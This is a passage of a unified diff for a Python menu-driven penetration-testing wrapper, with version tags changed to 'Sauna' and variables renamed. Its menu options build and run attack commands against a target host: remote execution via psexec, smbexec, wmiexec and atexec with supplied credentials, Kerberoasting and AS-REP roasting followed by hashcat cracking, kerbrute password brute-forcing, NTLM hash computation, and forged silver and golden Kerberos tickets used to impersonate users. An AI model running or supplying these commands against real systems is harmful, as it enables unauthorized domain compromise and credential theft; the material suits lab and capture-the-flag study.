 # -------------------------------------------------------------------------------------
@@ -791,14 +761,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '17':
-      if (HST[:5] != "EMPTY") & (TIP[:5] != "EMPTY"):
-         command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + HST.rstrip(" ") + " " + TIP.rstrip(" "))
+      if (DOM[:5] != "EMPTY") & (TIP[:5] != "EMPTY"):
+         command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
       else:
          print("Domain name or remote IP address not specified...")
       prompt()
@@ -806,7 +776,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Intense quick TCP scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -821,7 +791,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Full, slow and comprehensive nmap scan.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -836,75 +806,75 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - getArch.py -target IP
 # Details : 32/64 bit
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '20':
-      command(PRO + "getArch.py -target " + TIP.rstrip(" "))
+      command(PATH + "getArch.py -target " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='21':
-      command(PRO + "netview.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" "))
+      command(PATH + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - services.py USER:PASSWOrd@IP list.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='22':
-      command(PRO + "services.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list")
+      command(PATH + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '23':
-      command(PRO + "atexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
+      command(PATH + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + WCOM.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      command(PRO + "dcomexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
+      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + WCOM.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP cmd.exe.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
       os.remove("SHARES.tmp")
-      command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " cmd.exe > SHARES.tmp")
+      command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " cmd.exe > SHARES.tmp")
       command("cat SHARES.tmp")
     
       command("sed -i '1,3d' SHARES.tmp")
@@ -962,74 +932,74 @@ while True:
       if SH10 !="": SH10,SHA10 = SH10.split("is")
       if SH11 !="": SH11,SHA11 = SH11.split("is")
 
-      SH0   = dpadding(SH0, COL5)
-      SH1   = dpadding(SH1, COL5)
-      SH2   = dpadding(SH2, COL5)
-      SH3   = dpadding(SH3, COL5)
-      SH4   = dpadding(SH4, COL5)
-      SH5   = dpadding(SH5, COL5)
-      SH6   = dpadding(SH6, COL5)
-      SH7   = dpadding(SH7, COL5)
-      SH8   = dpadding(SH8, COL5)
-      SH9   = dpadding(SH9, COL5)
-      SH10  = dpadding(SH10, COL5)
-      SH11  = dpadding(SH11, COL5)
+      SH0   = dpadding(SH0, COL2)
+      SH1   = dpadding(SH1, COL2)
+      SH2   = dpadding(SH2, COL2)
+      SH3   = dpadding(SH3, COL2)
+      SH4   = dpadding(SH4, COL2)
+      SH5   = dpadding(SH5, COL2)
+      SH6   = dpadding(SH6, COL2)
+      SH7   = dpadding(SH7, COL2)
+      SH8   = dpadding(SH8, COL2)
+      SH9   = dpadding(SH9, COL2)
+      SH10  = dpadding(SH10, COL2)
+      SH11  = dpadding(SH11, COL2)
 
-      SHA0  = padding(SHA0, COL5)
-      SHA1  = padding(SHA1, COL5)
-      SHA2  = padding(SHA2, COL5)
-      SHA3  = padding(SHA3, COL5)
-      SHA4  = padding(SHA4, COL5)
-      SHA5  = padding(SHA5, COL5)
-      SHA6  = padding(SHA6, COL5)
-      SHA7  = padding(SHA7, COL5)
-      SHA8  = padding(SHA8, COL5)
-      SHA9  = padding(SHA9, COL5)
-      SHA10 = padding(SHA10, COL5)
-      SHA11 = padding(SHA11, COL5)
+      SHA0  = padding(SHA0, COL2)
+      SHA1  = padding(SHA1, COL2)
+      SHA2  = padding(SHA2, COL2)
+      SHA3  = padding(SHA3, COL2)
+      SHA4  = padding(SHA4, COL2)
+      SHA5  = padding(SHA5, COL2)
+      SHA6  = padding(SHA6, COL2)
+      SHA7  = padding(SHA7, COL2)
+      SHA8  = padding(SHA8, COL2)
+      SHA9  = padding(SHA9, COL2)
+      SHA10 = padding(SHA10, COL2)
+      SHA11 = padding(SHA11, COL2)
 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - smbexec.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '26':
-      command(PRO + "smbexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+      command(PATH + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - wmiexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      command(PRO + "wmiexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
+      command(PATH + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + WCOM.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ifmap.py IP 135.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '28':
-      command(PRO + "ifmap.py " + TIP.rstrip(" ") + " 135")
+      command(PATH + "ifmap.py " + TIP.rstrip(" ") + " 135")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - opdump.py IP 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1037,13 +1007,13 @@ while True:
    if selection == '29':
       ifmap = input("\nEnter MSRPC interface (ifmap) : ")     
       if ifmap != "":
-         command(PRO + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
+         command(PATH + "opdump.py " + TIP.rstrip(" ") + " 135 " + ifmap)
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
 # Details : Anonymous login check.
 # Modified: N/A
@@ -1056,39 +1026,39 @@ while True:
 #------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='31':
-      command(PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
+      command(PATH + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='32':
       print("\n[+] Please wait....\n")
-      command(PRO + "lookupsid.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
+      command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> DOMAIN.tmp")
       command("cat DOMAIN.tmp")
       command("cat DOMAIN.tmp | grep 'Domain SID' >> SID.tmp")
       os.remove("DOMAIN.tmp")
       DOMSID = linecache.getline("SID.tmp", 1)
       os.remove("SID.tmp")
       if DOMSID != "":
-         WGRP = DOMSID.replace('[*] Domain SID is: ',"")
+         DOMS = DOMSID.replace('[*] Domain SID is: ',"")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1098,7 +1068,7 @@ while True:
       os.remove("USERS.tmp")	# CLEAR WORK FILE
       os.remove("users.txt")	# CLEAR WORK FILE
 
-      command(PRO + "samrdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
+      command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " >> USERS.tmp")
       command("sed -i -n '/Found user: /p' USERS.tmp")	# SELECT ONLY FOUND USERS
       command("sort USERS.tmp > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
       os.remove("USERS.tmp")
@@ -1132,32 +1102,32 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='34':
-      command(PRO + "rpcdump.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
+      command(PATH + "rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Details : #HKEY_LOCAL_MACHINE\SAM
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='35':
-      command(PRO + "reg.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
+      command(PATH + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
 # Modified: 
 # -------------------------------------------------------------------------------------
@@ -1169,31 +1139,31 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R ?
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '37':
-      command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + HST.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + HIP.rstrip(" "))
+      command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '38':
-      command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + HIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
+      command("smbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1205,27 +1175,27 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      command(PRO + "GetADUsers.py -all " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -dc-ip "  + TIP.rstrip(" "))
+      command(PATH + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=users.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      print("\n[+] Please wait...")      
+      print("\n[*] Please wait...")      
       print("\n[+] Checking to see if any found username is assigned to Kerberous...")
-      command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + HST.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
+      command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=users.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
       command("sed -i '/@/!d' KUSERS.tmp")
       command("sort KUSERS.tmp > USERS2.tmp")
       os.remove("KUSERS.tmp")
@@ -1259,26 +1229,26 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - kerbrute.py -domain DOMAIN -users users.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      command(PRO + "kerbrute.py -domain " + HST.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
+      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
       if linecache.getline('users.txt', 1) != " ":
-         command(PRO + "GetUserSPNs.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -outputfile hashroast1.txt")
+         command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -outputfile hashroast1.txt")
          print("\n[+] Cracking hash values if they exists...\n")
          command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
          command("strings cracked1.txt")
@@ -1289,14 +1259,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
       if linecache.getline('users.txt', 1) != " ":
-         command(PRO + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + HST.rstrip(" ") + "/ -usersfile users.txt")
+         command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile users.txt")
          print("\n[+] Cracking hash values if they exists...\n")
          command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
          command("strings cracked2.txt")
@@ -1307,18 +1277,18 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '45':
       if PAS[:1] != "\"":
-         FRST = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
-         FRST = binascii.hexlify(FRST)
-         FRST = str(FRST)
-         FRST = FRST.lstrip("b'")
-         FRST = FRST.rstrip("'")
+         NTLM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
+         NTLM = binascii.hexlify(NTLM)
+         NTLM = str(NTLM)
+         NTLM = NTLM.lstrip("b'")
+         NTLM = NTLM.rstrip("'")
       else:
          print("Password not found...")
       prompt()
@@ -1326,7 +1296,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
@@ -1335,28 +1305,28 @@ while True:
    if selection == '46':
       print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
       if PAS[:1] != "\"":
-         command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
+         command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
          command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
       else:
-         if FRST[:1] != "":
-            command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + FRST)
+         if NTLM[:1] != "":
+            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTLM)
             command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
          else:
             print("User password or hash required...")
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
           print("TGT was not generated...")
-      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
+      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "................................"
       for x in range (0, MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         command(PRO + "getTGT.py " + HST.rstrip(" ") +  "/" + POR.rstrip(" ") + " -hashes :" + HASH)
-         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
-         if os.path.exists(POR.rstrip(" ") + ".ccache"):
-            command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + IMP.rstrip(" ") + " -hashes :" + HASH)
+         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+         if os.path.exists(IMP.rstrip(" ") + ".ccache"):
+            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
          else:
             print("TGT was not generated...")
       prompt()
@@ -1364,7 +1334,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -1376,7 +1346,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/Forest
 # Details : Silver Ticket!! 
 # Modified: N/A
@@ -1384,25 +1354,25 @@ while True:
 
    if selection == '48':
       print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
-      if (FRST[:1] != "") & (WGRP[:1] != ""):
-         command(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + USR.rstrip(" "))
+      if (NTLM[:1] != "") & (DOMS[:1] != ""):
+         command(PATH + "ticketer.py -nthash " + NTLM.rstrip("\n") + " -domain-sid " + DOMS.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + USR.rstrip(" "))
          command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
       else:
          print("Hash or Domain-SID not found...")
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
           print("Golden TGT was not generated...")      
-      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
+      print("\n[+] Trying user " + IMP.rstrip(" ") + " (IMPERSONATE)...\n")
       HASH = "................................"
       for x in range (0, MAX):
-         if US[x].rstrip(" ") == POR.rstrip(" "):    # IMPERSONATE VALUE
+         if US[x].rstrip(" ") == IMP.rstrip(" "):    # IMPERSONATE VALUE
             HASH = PA[x].rstrip(" ")                 # GET HASH
       if HASH[:1] != ".":
-         command(PRO + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " -spn cifs/" + DNSN.rstrip(" ") + " " + POR.rstrip(" "))
-         command("export KRB5CCNAME=" + POR.rstrip(" ") + ".ccache")
-      if os.path.exists(POR.rstrip(" ") + ".ccache"):
-         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + POR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PATH + "ticketer.py -nthash " + HASH.rstrip("\n") + " -domain-sid " + DOMS.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn cifs/" + DNS.rstrip(" ") + " " + IMP.rstrip(" "))
+         command("export KRB5CCNAME=" + IMP.rstrip(" ") + ".ccache")
+      if os.path.exists(IMP.rstrip(" ") + ".ccache"):
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + IMP.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
          print("Golden TGT was not generated...")
       prompt()
@@ -1410,32 +1380,32 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub11bc5814059277a4c697f5536e27beaa
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
       print("\n[+] Trying user " + USR.rstrip(" ") + "...\n")
-      if (FRST[:1] != "") & (WGRP[:1] != ""):
-         command(PRO + "ticketer.py -nthash " + FRST.rstrip("\n") + " -domain-sid " + WGRP.rstrip("\n") + " -domain " + HST.rstrip(" ") + " " + USR.rstrip(" "))
+      if (NTLM[:1] != "") & (DOMS[:1] != ""):
+         command(PATH + "ticketer.py -nthash " + NTLM.rstrip("\n") + " -domain-sid " + DOMS.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
          command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
       else:
          command("echo 'Hash or Domain-SID not found...'")
       if os.path.exists(USR.rstrip(" ") + ".ccache"):
-         command(PRO + "psexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + HST.rstrip(" ") + " -k -no-pass")
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
       else:
           print("Golden TGT was not generated...")
-      print("\n[+] Trying user " + POR.rstrip(" ") + " (IMPERSONATE)...\n")
